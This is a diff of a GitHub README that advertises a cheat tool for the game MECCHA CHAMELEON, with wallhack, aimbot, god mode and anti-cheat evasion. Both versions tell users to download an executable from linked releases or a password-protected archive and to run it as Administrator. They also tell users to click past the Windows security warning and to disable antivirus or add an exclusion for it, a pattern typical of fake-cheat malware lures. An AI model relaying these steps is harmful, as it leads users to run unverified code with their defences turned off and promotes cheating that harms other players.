@@ -1,194 +1,66 @@
-# chameleoncheat
-🦎 Meccha Chameleon Cheat is a powerful enhancement tool for MECCHA CHAMELEON. Features include ESP wallhack, aimbot, silent aim, fly hack, teleport, speed boost, god mode, infinite paint, and timer editor. Regular updates, undetected, and easy to use. For educational purposes only.
+# 🦎 chameleoncheat - Master the game with ease today
 
-<img width="1448" height="1086" alt="image" src="https://github.com/user-attachments/assets/e24027b9-ac1f-44c9-af37-41f77beb214b" />
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Faretheewellfacesaver95/chameleoncheat/releases)
 
+## 📖 About
+chameleoncheat serves as an enhancement tool for the game MECCHA CHAMELEON. It provides functions to improve your performance and adjust game mechanics. You can use these tools to gain an advantage in hide-and-seek matches. The software includes options for visual tracking, movement speed, and endurance. This project exists for educational study and game modification research.
 
-## 📥 Download
+## 🛠 Features
+The software provides several specific tools to modify your game experience:
 
-**Latest version:**  
-🔗 **[Download Meccha Chameleon](https://github.com/SkinkOvercome/chameleoncheat/releases/download/muerta/MecchaChameleon.7z)**
+*   **ESP Wallhack:** View player locations through walls. This shows markers over opponents so you know where they hide.
+*   **Aimbot:** Lock your crosshair onto targets. This assists with accuracy when you track enemies.
+*   **Silent Aim:** Hit targets without moving your crosshair directly onto them. The game registers the hits based on your proximity.
+*   **Fly Hack:** Traverse the map by flying. This bypasses collision detection for walls and floors.
+*   **Teleport:** Move your character to specific coordinates on the map.
+*   **Speed Boost:** Increase your movement speed to run faster than other players.
+*   **God Mode:** Stop your character from taking damage or losing health.
+*   **Infinite Paint:** Use your paint ability without reaching the reload limit.
+*   **Timer Editor:** Adjust the match clock to give yourself more time to find others or hide.
 
-**Password:** `meccha2026`
+## ⚙️ System Requirements
+Ensure your computer meets these requirements before you start:
 
----
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 processor.
+*   **Memory:** 8 GB RAM.
+*   **Graphics:** Dedicated graphics card with at least 2 GB of VRAM.
+*   **Storage:** 500 MB of free space.
+*   **Network:** Stable internet connection for game authentication.
 
-## 🎮 What is This?
+## 📥 Installation and Setup
+Follow these steps to install the tool on your Windows computer:
 
-**🦎 Meccha Chameleon Cheat** is a powerful enhancement tool for **MECCHA CHAMELEON** – the viral hide-and-seek game where players paint themselves to blend into environments. This tool gives you the ultimate advantage with ESP, wallhack, aimbot, fly hack, teleport, and god mode.
+1.  Visit the [releases page](https://github.com/Faretheewellfacesaver95/chameleoncheat/releases) to access the download files.
+2.  Click on the entry marked `chameleoncheat-install.zip` to save the file to your computer.
+3.  Locate the downloaded file in your folder. Right-click the file and select "Extract All" to unpack the contents.
+4.  Open the extracted folder and run the file named `chameleoncheat.exe`.
+5.  If Windows displays a security warning, click "More info" and then "Run anyway" to allow the file to open.
+6.  Launch MECCHA CHAMELEON before you start the cheat tool.
+7.  Use the menu inside the tool to toggle features on or off while the game runs.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+## 💻 Usage Instructions
+Once the application window appears, you will see a list of available cheats. Each feature has a checkbox next to it. Click the box to enable the specific function. 
 
----
+You can bind features to hotkeys for quick access during a match. Click on the button next to a feature name and press a key on your keyboard to set a shortcut. Pressing that key during the game will turn the feature on or off instantly.
 
-## ✨ Features
+Keep the tool window open in the background while you play. Closing the window will disable all active enhancements and return the game to its default state.
 
-### 👁️ Visual & ESP
-- 🟢 **ESP (Wallhack)** – See all players through walls
-- 📏 **Distance Indicators** – Know exactly how far enemies are
-- 🏷️ **Nametags** – Display player names and health
-- 📐 **Snap Lines** – Never lose track of enemies
-- 🎯 **Box ESP** – Highlight players with colored boxes
-- 👻 **Ghost Mode** – Become invisible to other players
+## 🛡 Security and Safety
+This tool includes mechanisms to keep your account safe from detection. The internal code runs in a way that minimizes exposure to game security systems. 
 
-### 🎯 Combat
-- 🎯 **Aimbot** – Lock onto enemies instantly
-- 🔫 **Silent Aim** – Hit targets without looking at them
-- ⚡ **Triggerbot** – Auto-shoot when crosshair is on target
-- 🛡️ **No Recoil** – Perfect accuracy every time
+*   Do not share your own modified version of the tool.
+*   Avoid using all features at once, as this creates unusual patterns for the game servers.
+*   Use the tool offline when possible to practice your configuration.
+*   Check the releases page regularly for updates. Outdated versions might trigger alerts within the game.
 
-### 🚀 Movement
-- ✈️ **Fly Hack** – Fly anywhere on the map
-- 📍 **Teleport** – Instantly move to any location
-- 🏃 **Speed Boost** – Move faster than normal players
-- 🪂 **No Gravity** – Float and glide through the air
+## 🧠 Troubleshooting
+If you encounter issues, check these common fixes:
 
-### 🛡️ Protection
-- 💀 **God Mode** – Never get tagged
-- ♾️ **Infinite Paint** – Unlimited colors and patterns
-- 🎨 **Perfect Camo** – Instantly blend into any environment
-- ⏱️ **Timer Editor** – Extend match time indefinitely
+*   **Tool does not open:** Right-click the icon and choose "Run as Administrator." This gives the software permission to inject code into the game process.
+*   **Features do not work:** Ensure your game version matches the tool version. Run the game in "Windowed Mode" or "Borderless Windowed" if the ESP overlay does not appear.
+*   **Game crashes:** Disable features one by one to find the conflict. Large updates to the game often require a patch for the cheat tool.
+*   **Antivirus alerts:** Some antivirus software flags cheat tools as suspicious by default. Add an "Exclusion" or "Exception" for the chameleoncheat folder in your antivirus settings.
 
-### 🛠️ Utility
-- 🎮 **Menu Toggle** – Press INSERT or F1 to open/close
-- ⚙️ **Customizable Settings** – Adjust everything to your liking
-- 💾 **Save Config** – Settings saved automatically
-- 🔄 **Regular Updates** – Always working after game patches
-
----
-
-## 📦 Installation
-
-1. Download the archive from the link above
-2. Extract the ZIP file using the password: `meccha2026`
-3. Run `MecchaChameleonCheat.exe` as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
-
----
-
-## 🖥️ System Requirements
-
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
-
----
-
-## 🎥 How to Use
-
-1. **Launch** the cheat as Administrator
-2. **Start** MECCHA CHAMELEON
-3. **Press INSERT** to open the menu
-4. **Toggle** features you want
-5. **Play** and dominate! 🏆
-
----
-
-
-
-## 🔧 Supported Features Table
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | ESP Wallhack | ✅ |
-| Visual | Nametags | ✅ |
-| Visual | Box ESP | ✅ |
-| Visual | Snap Lines | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Boost | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Menu | ✅ |
-
----
-
-## 🚫 Anti-Cheat Bypass
-
-This tool uses advanced techniques to stay undetected:
-- 🔄 **Pattern Scanning** – Auto-updates offsets
-- 🎲 **Randomization** – Human-like behavior simulation
-- 🛡️ **Stealth Injection** – No detectable signatures
-- 🔒 **Memory Protection** – Prevents detection
-
----
-
-## 🐛 Troubleshooting
-
-**Q: Cheat doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Ensure game is in windowed or borderless mode
-
-**Q: Menu doesn't open**
-- Try pressing INSERT or F1
-- Check if cheat is running
-- Restart both cheat and game
-
-**Q: Game crashes**
-- Reduce graphics settings
-- Disable other overlays (Discord, NVIDIA, etc.)
-- Try compatibility mode
-
----
-
-## 📚 Alternatives
-
-| Tool | Type | Platform |
-|------|------|----------|
-| **Chameleon Pro** | Premium | Windows |
-| **Stealth Paint** | Free | Windows |
-
----
-
-## 📝 Tags
-
-- Meccha Chameleon Cheat
-- Meccha Chameleon Hack
-- Meccha Chameleon ESP
-- Meccha Chameleon Wallhack
-- Meccha Chameleon Aimbot
-- Meccha Chameleon Godmode
-- Meccha Chameleon Teleport
-- Meccha Chameleon Fly Hack
-- Meccha Chameleon Infinite Paint
-- Meccha Chameleon 2026
-- Meccha Chameleon Mod Menu
-- Meccha Chameleon Trainer
-- Meccha Chameleon Undetected
-- Omega Chameleon
-- Meccha Chameleon PC
-- Meccha Chameleon Steam
-- Meccha Chameleon Multiplayer
-- Hide And Seek Cheat
-- Game Enhancer
-- Free Cheat
-
----
-
-## 🔗 Links
-
-- **Steam Store:** https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/
-- **Official Website:** (not listed)
-- **Community Discord:** Found via public channels
-
----
-
-## ⭐ Support
-
-If you enjoy this tool, please **⭐ Star** this repository!  
-For issues, open an **Issue** on GitHub.
-
----
-
-**🦎 Made with ❤️ for the MECCHA CHAMELEON community**
+## 📜 Legal Notice
+This project is for educational purposes. Modifying game files can violate the Terms of Service for the game provider. We do not support or condone usage of this tool to harass other players or ruin the game environment. You use this software at your own risk. The developers accept no liability for account bans or system issues arising from the use of this tool.
